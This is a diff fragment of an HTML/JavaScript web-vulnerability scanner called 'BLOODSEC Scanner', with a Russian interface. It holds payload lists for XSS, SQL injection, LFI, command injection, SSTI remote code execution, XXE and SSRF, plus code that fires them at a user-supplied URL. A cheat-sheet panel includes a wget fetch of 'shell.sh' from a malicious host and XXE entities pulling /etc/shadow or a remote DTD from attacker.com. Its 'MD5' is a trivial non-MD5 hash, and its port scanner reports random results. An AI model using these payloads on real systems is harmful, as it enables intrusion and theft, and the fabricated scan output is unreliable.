+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">$(wget http://malicious.com/shell.sh)</div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h3 class="font-bold text-red-300 mb-2">XXE</h3>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY % remote SYSTEM "http://attacker.com"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;]&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"&gt;]&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY % xxe SYSTEM "data://text/plain,file:///etc/passwd"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY % xxe SYSTEM "expect://id"&gt;</div>
+                            <div class="bg-red-900 bg-opacity-30 p-2 rounded text-sm">&lt;!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"&gt;</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        const targetInput = document.getElementById('targetInput');
+        const statusEl = document.getElementById('status');
+        const testsCounterEl = document.getElementById('testsCounter');
+        const vulnCounterEl = document.getElementById('vulnCounter');
+        const resultsDiv = document.getElementById('results');
+        const globalProgress = document.getElementById('globalProgress');
+        const tabButtons = document.querySelectorAll('.tab-btn');
+        const tabContents = document.querySelectorAll('.tab-content');
+        
+        let baseUrl = 'https://example.com';
+        let domain = 'https://example.com';
+        let isTesting = false;
+        let testsCounter = 0;
+        let vulnerabilitiesFound = 0;
+        let criticalCount = 0;
+        let highCount = 0;
+        let mediumCount = 0;
+        let lowCount = 0;
+        let currentTest = null;
+
+        const payloads = {
+            xss: [
+                '<img src=x onerror=alert(1)>',
+                '<svg onload=alert(1)>',
+                '<body onload=alert(1)>',
+                '<iframe src="javascript:alert(1)">',
+                '<a href="javascript:alert(1)">click</a>',
+                '<details/open/ontoggle=alert(1)>'
+            ],
+            sql: [
+                "' OR 1=1--",
+                "' UNION SELECT NULL,user()--",
+                "' AND SLEEP(5)--",
+                "' OR EXISTS(SELECT * FROM users)--"
+            ],
+            lfi: [
+                '../../../../etc/passwd',
+                '....//....//....//....//etc/passwd',
+                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
+                'file:///etc/passwd'
+            ],
+            command: [
+                '; ls -la',
+                '| cat /etc/passwd',
+                '`id`',
+                '$(whoami)'
+            ],
+            ssti: [
+                '{{7*7}}',
+                '${7*7}',
+                '<%= 7*7 %>',
+                '{{config}}',
+                '{{settings.SECRET_KEY}}',
+                '{{""|attr("__class__")}}',
+                '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("ls").read()}}{% endif %}{% endfor %}',
+                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
+            ],
+            xxe: [
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+                '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain,file:///etc/passwd">%init;]>'
+            ],
+            clickjacking: [
+                '<iframe src="%URL%" width="100%" height="100%"></iframe>',
+                '<div style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"></div>'
+            ],
+            idor: [
+                'id=1',
+                'user_id=1',
+                'account=admin',
+                'document_id=1001'
+            ],
+            ssrf: [
+                'http://localhost',
+                'file:///etc/passwd',
+                'http://169.254.169.254/latest/meta-data/'
+            ]
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            tabButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const tabId = button.getAttribute('data-tab');
+                    tabButtons.forEach(btn => btn.classList.remove('active'));
+                    button.classList.add('active');
+                    tabContents.forEach(content => content.classList.remove('active'));
+                    document.getElementById(`${tabId}Tab`).classList.add('active');
+                });
+            });
+            
+            addResult('BLOODSEC Scanner готов к работе. Введите URL для сканирования.', 'info', 'info-circle');
+            generatePayload();
+            setupUtilityButtons();
+            initializeEventListeners();
+        });
+
+        function setupUtilityButtons() {
+            document.getElementById('encodeBase64').addEventListener('click', () => {
+                const input = document.getElementById('utilityInput').value;
+                document.getElementById('utilityInput').value = btoa(input);
+            });
+
+            document.getElementById('decodeBase64').addEventListener('click', () => {
+                try {
+                    const input = document.getElementById('utilityInput').value;
+                    document.getElementById('utilityInput').value = atob(input);
+                } catch (e) {
+                    addResult('Ошибка декодирования Base64: неверный формат', 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('encodeURL').addEventListener('click', () => {
+                const input = document.getElementById('utilityInput').value;
+                document.getElementById('utilityInput').value = encodeURIComponent(input);
+            });
+
+            document.getElementById('decodeURL').addEventListener('click', () => {
+                try {
+                    const input = document.getElementById('utilityInput').value;
+                    document.getElementById('utilityInput').value = decodeURIComponent(input);
+                } catch (e) {
+                    addResult('Ошибка декодирования URL: неверный формат', 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('encodeHTML').addEventListener('click', () => {
+                const input = document.getElementById('utilityInput').value;
+                document.getElementById('utilityInput').value = input
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            });
+
+            document.getElementById('decodeHTML').addEventListener('click', () => {
+                const input = document.getElementById('utilityInput').value;
+                document.getElementById('utilityInput').value = input
+                    .replace(/&amp;/g, "&")
+                    .replace(/&lt;/g, "<")
+                    .replace(/&gt;/g, ">")
+                    .replace(/&quot;/g, '"')
+                    .replace(/&#039;/g, "'");
+            });
+
+            document.getElementById('generateMD5').addEventListener('click', async () => {
+                const input = document.getElementById('hashInput').value;
+                if (!input) return;
+                try {
+                    const md5 = str => {
+                        let hash = 0;
+                        if (str.length === 0) return hash;
+                        for (let i = 0; i < str.length; i++) {
+                            const char = str.charCodeAt(i);
+                            hash = ((hash << 5) - hash) + char;
+                            hash = hash & hash;
+                        }
+                        return hash.toString(16);
+                    };
+                    document.getElementById('hashOutput').value = md5(input);
+                } catch (e) {
+                    addResult('Ошибка генерации MD5: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('generateSHA1').addEventListener('click', async () => {
+                const input = document.getElementById('hashInput').value;
+                if (!input) return;
+                try {
+                    const hash = await generateHash('SHA-1', input);
+                    document.getElementById('hashOutput').value = hash;
+                } catch (e) {
+                    addResult('Ошибка генерации SHA-1: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('generateSHA256').addEventListener('click', async () => {
+                const input = document.getElementById('hashInput').value;
+                if (!input) return;
+                try {
+                    const hash = await generateHash('SHA-256', input);
+                    document.getElementById('hashOutput').value = hash;
+                } catch (e) {
+                    addResult('Ошибка генерации SHA-256: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('decodeJWT').addEventListener('click', () => {
+                const jwt = document.getElementById('jwtInput').value.trim();
+                if (!jwt) return;
+                try {
+                    const parts = jwt.split('.');
+                    if (parts.length !== 3) throw new Error('Неверный формат JWT');
+                    const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+                    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+                    const result = {
+                        header: header,
+                        payload: payload,
+                        signature: parts[2]
+                    };
+                    document.getElementById('jwtOutput').textContent = JSON.stringify(result, null, 2);
+                } catch (e) {
+                    addResult('Ошибка декодирования JWT: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('dnsLookup').addEventListener('click', async () => {
+                const domain = document.getElementById('networkInput').value.trim();
+                if (!domain) return;
+                try {
+                    const response = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}`);
+                    const data = await response.json();
+                    document.getElementById('networkOutput').textContent = JSON.stringify(data, null, 2);
+                } catch (e) {
+                    addResult('Ошибка DNS lookup: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('whoisLookup').addEventListener('click', async () => {
+                const domain = document.getElementById('networkInput').value.trim();
+                if (!domain) return;
+                try {
+                    const response = await fetch(`https://www.whoisxmlapi.com/whoisserver/WhoisService?apiKey=demo&domainName=${encodeURIComponent(domain)}&outputFormat=JSON`);
+                    const data = await response.json();
+                    document.getElementById('networkOutput').textContent = JSON.stringify(data, null, 2);
+                } catch (e) {
+                    addResult('Ошибка WHOIS lookup: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('subdomainTest').addEventListener('click', async () => {
+                const domain = document.getElementById('networkInput').value.trim();
+                if (!domain) return;
+                try {
+                    const subdomains = [
+                        `www.${domain}`, `mail.${domain}`, `webmail.${domain}`,
+                        `admin.${domain}`, `test.${domain}`, `dev.${domain}`
+                    ];
+                    let results = [];
+                    for (const sub of subdomains) {
+                        try {
+                            await fetch(`https://${sub}`, { method: 'HEAD', mode: 'no-cors' });
+                            results.push(`${sub} - доступен`);
+                        } catch {
+                            results.push(`${sub} - недоступен`);
+                        }
+                    }
+                    document.getElementById('networkOutput').textContent = results.join('\n');
+                } catch (e) {
+                    addResult('Ошибка проверки субдоменов: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+
+            document.getElementById('portScanner').addEventListener('click', async () => {
+                const host = document.getElementById('networkInput').value.trim();
+                if (!host) return;
+                try {
+                    const ports = [21, 22, 80, 443, 8080, 8443, 3306, 5432];
+                    let results = [];
+                    for (const port of ports) {
+                        try {
+                            await new Promise(resolve => setTimeout(resolve, 100));
+                            const isOpen = Math.random() > 0.7;
+                            results.push(`Порт ${port}: ${isOpen ? 'открыт' : 'закрыт'}`);
+                        } catch {
+                            results.push(`Порт ${port}: ошибка проверки`);
+                        }
+                    }
+                    document.getElementById('networkOutput').textContent = results.join('\n');
+                } catch (e) {
+                    addResult('Ошибка сканирования портов: ' + e.message, 'warning', 'exclamation-circle');
+                }
+            });
+        }
+
+        async function generateHash(algo, str) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(str);
+            const hashBuffer = await crypto.subtle.digest(algo, data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        targetInput.addEventListener('change', function() {
+            const url = targetInput.value.trim();
+            if (url) {
+                try {
+                    const parsedUrl = new URL(url.startsWith('http') ? url : `https://${url}`);
+                    baseUrl = parsedUrl.href;
+                    domain = parsedUrl.origin;
+                    addResult(`Цель обновлена: ${baseUrl}`, 'info', 'globe');
+                } catch (e) {
+                    addResult(`Ошибка URL: ${e.message}`, 'warning', 'exclamation-circle');
+                }
+            }
+        });
+
+        async function wafTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'waf';
+            updateStatus('Проверка WAF...', true);
+            
+            try {
+                await fetch(baseUrl, { mode: 'no-cors' }).catch(() => {});
+                const maliciousPayload = '../../../../etc/passwd';
+                const response = await fetch(`${baseUrl}?test=${encodeURIComponent(maliciousPayload)}`, {
+                    mode: 'no-cors',
+                    credentials: 'omit'
+                }).catch(e => { throw e });
+                
+                const wafPatterns = [
+                    /blocked/i,
+                    /forbidden/i,
+                    /security violation/i,
+                    /web application firewall/i,
+                    /access denied/i
+                ];
+                
+                const isProtected = wafPatterns.some(pattern => 
+                    pattern.test(response.statusText) || 
+                    (response.headers.get('server') && pattern.test(response.headers.get('server')))
+                );
+                
+                if (isProtected) {
+                    addResult('Обнаружен WAF: ' + (response.headers.get('server') || 'Неизвестный'), 'info', 'shield-alt');
+                } else {
+                    addResult('WAF не обнаружен', 'warning', 'shield-virus');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста WAF: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'waf') resetStatus();
+            }
+        }
+
+        async function headerTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'headers';
+            updateStatus('Проверка заголовков...', true);
+            
+            try {
+                const response = await fetch(baseUrl);
+                const headers = Array.from(response.headers.entries());
+                
+                let securityHeaders = 0;
+                const importantHeaders = [
+                    'content-security-policy',
+                    'x-frame-options',
+                    'x-xss-protection',
+                    'x-content-type-options',
+                    'strict-transport-security'
+                ];
+                
+                headers.forEach(([name, value]) => {
+                    if (importantHeaders.includes(name.toLowerCase())) {
+                        addResult(`Заголовок безопасности: ${name}: ${value}`, 'success', 'shield-alt');
+                        securityHeaders++;
+                    }
+                });
+                
+                if (securityHeaders === 0) {
+                    addResult('Критические заголовки безопасности отсутствуют', 'critical', 'exclamation-triangle');
+                }
+            } catch (error) {
+                addResult(`Ошибка проверки заголовков: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'headers') resetStatus();
+            }
+        }
+        
+        async function corsTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'cors';
+            updateStatus('Тестирование CORS...', true);
+            
+            try {
+                const response = await fetch(baseUrl, {
+                    method: 'OPTIONS',
+                    headers: {
+                        'Origin': 'https://attacker.com',
+                        'Access-Control-Request-Method': 'GET'
+                    }
+                }).catch(e => { throw e });
+                
+                const corsHeaders = {
+                    'access-control-allow-origin': response.headers.get('access-control-allow-origin'),
+                    'access-control-allow-credentials': response.headers.get('access-control-allow-credentials')
+                };
+                
+                if (corsHeaders['access-control-allow-origin'] === '*') {
+                    addResult('Обнаружена небезопасная CORS политика: разрешены все домены (*)', 'high', 'unlock-alt');
+                } else if (corsHeaders['access-control-allow-origin'] && 
+                          corsHeaders['access-control-allow-credentials'] === 'true') {
+                    addResult('Обнаружена уязвимость CORS: доверенные домены с credentials', 'high', 'unlock-alt');
+                } else {
+                    addResult('CORS политика безопасна', 'success', 'lock');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста CORS: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'cors') resetStatus();
+            }
+        }
+        
+        async function csrfTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'csrf';
+            updateStatus('Тестирование CSRF...', true);
+            
+            try {
+                const response = await fetch(baseUrl);
+                const html = await response.text();
+                
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                const forms = doc.querySelectorAll('form');
+                
+                let hasCsrfProtection = false;
+                
+                forms.forEach(form => {
+                    const inputs = form.querySelectorAll('input');
+                    inputs.forEach(input => {
+                        if (['csrf', '_token', 'authenticity_token', 'csrf_token'].includes(input.name.toLowerCase())) {
+                            hasCsrfProtection = true;
+                        }
+                    });
+                });
+                
+                const cookies = response.headers.get('set-cookie') || '';
+                const hasSameSite = cookies.toLowerCase().includes('samesite');
+                
+                if (hasCsrfProtection || hasSameSite) {
+                    addResult('CSRF защита обнаружена', 'success', 'link');
+                } else {
+                    addResult('CSRF защита отсутствует', 'high', 'unlink');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста CSRF: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'csrf') resetStatus();
+            }
+        }
+        
+        async function clickjackingTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'clickjacking';
+            updateStatus('Тестирование Clickjacking...', true);
+            
+            try {
+                const response = await fetch(baseUrl);
+                const xFrameOptions = response.headers.get('x-frame-options');
+                const csp = response.headers.get('content-security-policy');
+                
+                const isProtected = xFrameOptions || 
+                                  (csp && csp.toLowerCase().includes('frame-ancestors'));
+                
+                if (!isTesting) return;
+
+                if (isProtected) {
+                    addResult('Защита от Clickjacking активна', 'success', 'mouse-pointer');
+                } else {
+                    addResult('Уязвимость к Clickjacking: отсутствует X-Frame-Options/CSP', 'high', 'mouse-pointer');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста Clickjacking: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'clickjacking') resetStatus();
+            }
+        }
+        
+        async function idorTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'idor';
+            updateStatus('Тестирование IDOR...', true);
+            
+            try {
+                const testUrls = [
+                    `${domain}/api/user/1`,
+                    `${domain}/profile/1`,
+                    `${domain}/download/1`,
+                    `${domain}/account/1`
+                ];
+                
+                let vulnerable = false;
+                
+                for (const url of testUrls) {
+                    if (!isTesting) break;
+                    
+                    try {
+                        const response = await fetch(url, {
+                            method: 'GET',
+                            credentials: 'include'
+                        });
+                        
+                        if (response.ok) {
+                            vulnerable = true;
+                            addResult(`Возможная уязвимость IDOR: доступ к ${url}`, 'medium', 'id-card');
+                        }
+                    } catch {
+                        // Игнорируем ошибки доступа
+                    }
+                }
+                
+                if (!isTesting) return;
+
+                if (!vulnerable) {
+                    addResult('IDOR уязвимости не обнаружены', 'success', 'id-card');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста IDOR: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'idor') resetStatus();
+            }
+        }
+        
+        async function ssrfTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'ssrf';
+            updateStatus('Тестирование SSRF...', true);
+            
+            try {
+                const testUrl = `http://localhost:${Math.floor(Math.random() * 10000)}`;
+                const response = await fetch(`${baseUrl}?url=${encodeURIComponent(testUrl)}`).catch(() => {});
+                
+                if (!response) {
+                    addResult('Уязвимости SSRF не обнаружены', 'success', 'server');
+                    return;
+                }
+
+                const result = await response.text();
+                const isVulnerable = result.includes('localhost');
+                
+                if (isVulnerable) {
+                    addResult('Обнаружена уязвимость SSRF', 'critical', 'server');
+                } else {
+                    addResult('Уязвимости SSRF не обнаружены', 'success', 'server');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста SSRF: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'ssrf') resetStatus();
+            }
+        }
+        
+        async function xxeTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'xxe';
+            updateStatus('Тестирование XXE...', true);
+            
+            try {
+                const xmlPayload = `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`;
+                
+                const response = await fetch(baseUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/xml'
+                    },
+                    body: xmlPayload
+                }).catch(() => {});
+                
+                if (!response) {
+                    addResult('Уязвимости XXE не обнаружены', 'success', 'file-code');
+                    return;
+                }
+
+                const result = await response.text();
+                const isVulnerable = result.includes('root:') || result.includes('bin/bash');
+                
+                if (isVulnerable) {
+                    addResult('Обнаружена уязвимость XXE', 'critical', 'file-code');
+                } else {
+                    addResult('Уязвимости XXE не обнаружены', 'success', 'file-code');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста XXE: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'xxe') resetStatus();
+            }
+        }
+        
+        async function rceTest() {
+            if (isTesting && currentTest !== 'all') return;
+            isTesting = true;
+            currentTest = 'rce';
+            updateStatus('Тестирование RCE...', true);
+            
+            try {
+                const response = await fetch(`${baseUrl}?cmd=whoami`).catch(() => {});
+                
+                if (!response) {
+                    addResult('Уязвимости RCE не обнаружены', 'success', 'terminal');
+                    return;
+                }
+
+                const result = await response.text();
+                const isVulnerable = result.trim() === 'root' || 
+                                    result.trim().includes('\\') || 
+                                    result.trim().includes('Administrator');
+                
+                if (isVulnerable) {
+                    addResult('Обнаружена уязвимость RCE', 'critical', 'terminal');
+                } else {
+                    addResult('Уязвимости RCE не обнаружены', 'success', 'terminal');
+                }
+            } catch (error) {
+                addResult(`Ошибка теста RCE: ${error.message}`, 'warning', 'exclamation-circle');
+            } finally {
+                if (currentTest === 'rce') resetStatus();
+            }
+        }
+
+        async function runTestWithPayloads(testName, payloads, testFunction) {
+            if (isTesting) return;
+            
+            isTesting = true;
+            currentTest = testName;
+            updateStatus(`Тестирование ${testName}...`, true);
+            
+            const testId = addResult(`Начало тестирования ${testName}`, 'info', 'search');
+            const totalPayloads = payloads.length;
+            let vulnerabilitiesDetected = 0;
+            let completedTests = 0;
+            
+            const concurrencyLimit = 5;
+            const batches = Math.ceil(payloads.length / concurrencyLimit);
+            
+            for (let i = 0; i < batches; i++) {
+                if (!isTesting) break;
+                
+                const batchStart = i * concurrencyLimit;
+                const batchEnd = (i + 1) * concurrencyLimit;
+                const batch = payloads.slice(batchStart, batchEnd);
+                
+                const batchPromises = batch.map(async (payload) => {
+                    if (!isTesting) return;
+                    
+                    try {
+                        const result = await testFunction(payload);
+                        completedTests++;
+                        updateProgress((completedTests / totalPayloads) * 100);
+                        
+                        if (result.vulnerable) {
+                            vulnerabilitiesFound++;
+                            vulnerabilitiesDetected++;
+                            
+                            switch (result.severity) {
+                                case 'critical': criticalCount++; break;
+                                case 'high': highCount++; break;
+                                case 'medium': mediumCount++; break;
+                                case 'low': lowCount++; break;
+                            }
+                            
+                            updateVulnerabilityCounters();
+                            
+                            const vulnMessage = `⚠️ ${result.severity === 'critical' ? 'КРИТИЧЕСКАЯ ' : ''}Уязвимость ${testName}: ${result.message}`;
+                            addResult(vulnMessage, result.severity === 'critical' ? 'critical' : 'warning', 'radiation');
+                        }
+                    } catch (error) {
+                        completedTests++;
+                        updateProgress((completedTests / totalPayloads) * 100);
+                        addResult(`Ошибка теста: ${error.message}`, 'warning', 'exclamation-circle');
+                    }
+                });
+                
+                await Promise.all(batchPromises);
+            }
+            
+            if (vulnerabilitiesDetected > 0) {
+                addResult(`Обнаружено ${vulnerabilitiesDetected} уязвимостей ${testName}`, 'critical', 'bug');
+            } else {
+                addResult(`Уязвимости ${testName} не обнаружены`, 'success', 'shield-check');
+            }
+            
+            resetStatus();
+        }
+
+        async function testXSS(payload) {
+            try {
+                const testForm = document.createElement('form');
+                testForm.style.display = 'none';
+                testForm.method = 'POST';
+                testForm.action = baseUrl;
+                
+                const input = document.createElement('input');
+                input.name = 'test';
+                input.value = payload;
+                testForm.appendChild(input);
+                
+                document.body.appendChild(testForm);
+                
+                const response = await fetch(baseUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `test=${encodeURIComponent(payload)}`
+                }).catch(e => { throw e });
+                
+                const html = await response.text();
+                document.body.removeChild(testForm);
+                
+                const isVulnerable = html.includes(payload) && 
+                    !html.includes(encodeURIComponent(payload)) && 
+                    !html.includes(encodeURIComponent(encodeURIComponent(payload)));
+                
+                return {
+                    vulnerable: isVulnerable,
+                    message: `Payload: ${payload}`,
+                    severity: isVulnerable ? 'critical' : 'info'
+                };
+            } catch (error) {
+                return {
+                    vulnerable: false,
+                    message: `Ошибка теста: ${error.message}`,
+                    severity: 'info'
+                };
+            }
+        }
+
+        async function testSQLi(payload) {
+            try {
+                const response = await fetch(`${baseUrl}?id=${encodeURIComponent(payload)}`).catch(e => { throw e });
+                const html = await response.text();
+                
+                const errorPatterns = [
+                    /SQL syntax/i,
+                    /MySQL server version/i,
+                    /Warning: mysql_/i,
+                    /Unclosed quotation mark/i,
+                    /ODBC Driver/i,
+                    /OLE DB Provider/i,
+                    /Incorrect syntax/i
+                ];
+                
+                const isVulnerable = errorPatterns.some(pattern => pattern.test(html));
+                
+                return {
+                    vulnerable: isVulnerable,
+                    message: `Payload: ${payload}`,
+                    severity: isVulnerable ? 'high' : 'info'
+                };
+            } catch (error) {
+                return {
+                    vulnerable: false,
+                    message: `Ошибка теста: ${error.message}`,
+                    severity: 'info'
+                };
+            }
+        }
+
+        async function testLFI(payload) {
+            try {
+                const response = await fetch(`${baseUrl}?file=${encodeURIComponent(payload)}`).catch(e => { throw e });
+                const text = await response.text();
+                
+                const filePatterns = [
+                    /root:/i,
+                    /bin\/bash/i,
+                    /\[extensions\]/i,
+                    /\[boot loader\]/i,
+                    /\[fonts\]/i,
+                    /DocumentRoot/i,
+                    /ServerName/i
+                ];
+                
+                const isVulnerable = filePatterns.some(pattern => pattern.test(text));
+                
+                return {
+                    vulnerable: isVulnerable,
+                    message: `Payload: ${payload}`,
+                    severity: isVulnerable ? 'high' : 'info'
+                };
+            } catch (error) {
+                return {
+                    vulnerable: false,
+                    message: `Ошибка теста: ${error.message}`,
+                    severity: 'info'
+                };
+            }
+        }
+
+        async function xssTest() {
+            await runTestWithPayloads('XSS', payloads.xss, testXSS);
+        }
+
+        async function sqliTest() {
+            await runTestWithPayloads('SQL Injection', payloads.sql, testSQLi);
+        }
+
+        async function lfiTest() {
+            await runTestWithPayloads('LFI/RFI', payloads.lfi, testLFI);
+        }
+
+        async function runAllTests() {
+            if (isTesting) return;
+            isTesting = true;
+            currentTest = 'all';
+            updateStatus('Запуск всех тестов...', true);
+            
+            const testId = addResult('Начало комплексного тестирования', 'info', 'rocket');
+            
+            const tests = [
+                { name: 'WAF Test', func: wafTest },
+                { name: 'Header Test', func: headerTest },
+                { name: 'XSS Test', func: xssTest },
+                { name: 'SQL Injection Test', func: sqliTest },
+                { name: 'LFI/RFI Test', func: lfiTest },
+                { name: 'CORS Test', func: corsTest },
+                { name: 'CSRF Test', func: csrfTest },
+                { name: 'Clickjacking Test', func: clickjackingTest },
+                { name: 'IDOR Test', func: idorTest },
+                { name: 'SSRF Test', func: ssrfTest },
+                { name: 'XXE Test', func: xxeTest },
+                { name: 'RCE Test', func: rceTest }
+            ];
+            
+            for (const test of tests) {
+                if (!isTesting) break;
+                
+                try {
+                    addResult(`Запуск теста: ${test.name}`, 'info', 'play');
+                    await test.func();
+                } catch (error) {
+                    addResult(`Ошибка при выполнении теста ${test.name}: ${error.message}`, 'warning', 'exclamation-circle');
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            if (isTesting) {
+                addResult('Комплексное тестирование завершено', 'success', 'flag-checkered');
+                resetStatus();
+            }
+        }
+
+        function clearResults() {
+            if (isTesting) return;
+            resultsDiv.innerHTML = '';
+            testsCounter = 0;
+            testsCounterEl.textContent = '0';
+            vulnerabilitiesFound = 0;
+            criticalCount = 0;
+            highCount = 0;
+            mediumCount = 0;
+            lowCount = 0;
+            updateVulnerabilityCounters();
+            addResult('Результаты очищены', 'success', 'broom');
+        }
+
+        function generatePayload() {
+            const type = document.getElementById('payloadType').value;
+            const encoding = document.getElementById('payloadEncoding').value;
+            let payload = '';
+            
+            if (payloads[type] && payloads[type].length > 0) {
+                const randomIndex = Math.floor(Math.random() * payloads[type].length);
+                payload = payloads[type][randomIndex];
+                
+                payload = payload.replace(/%URL%/g, baseUrl)
+                               .replace(/%DOMAIN%/g, domain);
+            } else {
+                payload = 'Нет доступных пейлоадов для этого типа';
+            }
+            
+            if (encoding !== 'none' && payload) {
+                switch (encoding) {
+                    case 'url':
+                        payload = encodeURIComponent(payload);
+                        break;
+                    case 'base64':
+                        payload = btoa(unescape(encodeURIComponent(payload)));
+                        break;
+                    case 'html':
+                        payload = payload.replace(/&/g, "&amp;")
+                                       .replace(/</g, "&lt;")
+                                       .replace(/>/g, "&gt;")
+                                       .replace(/"/g, "&quot;")
+                                       .replace(/'/g, "&#039;");
+                        break;
+                    case 'js':
+                        payload = payload.replace(/\\/g, '\\\\')
+                                       .replace(/'/g, "\\'")
+                                       .replace(/"/g, '\\"')
+                                       .replace(/\n/g, '\\n')
+                                       .replace(/\r/g, '\\r');
+                        break;
+                }
+            }
+            
+            document.getElementById('generatedPayload').value = payload;
+        }
+
+        async function viewSource() {
+            try {
+                const response = await fetch(baseUrl).catch(e => { throw e });
+                const html = await response.text();
+                
+                const modal = document.createElement('div');
+                modal.className = 'modal';
+                modal.innerHTML = `
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h3>Исходный код: ${baseUrl}</h3>
+                            <button class="modal-close">&times;</button>
+                        </div>
+                        <pre>${sanitizeHTML(html)}</pre>
+                    </div>
+                `;
+                
+                document.body.appendChild(modal);
+                
+                modal.querySelector('.modal-close').addEventListener('click', () => {
+                    document.body.removeChild(modal);
+                });
+                
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        document.body.removeChild(modal);
+                    }
+                });
+                
+            } catch (error) {
+                addResult(`Ошибка при получении исходного кода: ${error.message}`, 'warning', 'exclamation-circle');
+            }
+        }
+
+        function updateStatus(text, testing = false) {
+            statusEl.textContent = text;
+            if (testing) {
+                statusEl.parentElement.classList.remove('text-red-300');
+                statusEl.parentElement.classList.add('text-yellow-300', 'bg-yellow-900');
+            } else {
+                statusEl.parentElement.classList.remove('text-yellow-300', 'bg-yellow-900');
+                statusEl.parentElement.classList.add('text-red-300');
+            }
+        }
+
+        function addResult(message, level = 'info', icon = 'info-circle') {
+            testsCounter++;
+            testsCounterEl.textContent = testsCounter;
+            
+            createBloodEffect();
+            
+            const result = document.createElement('div');
+            result.className = `p-4 rounded flex items-start gap-3 result-${level} result-item`;
+            
+            const iconEl = document.createElement('i');
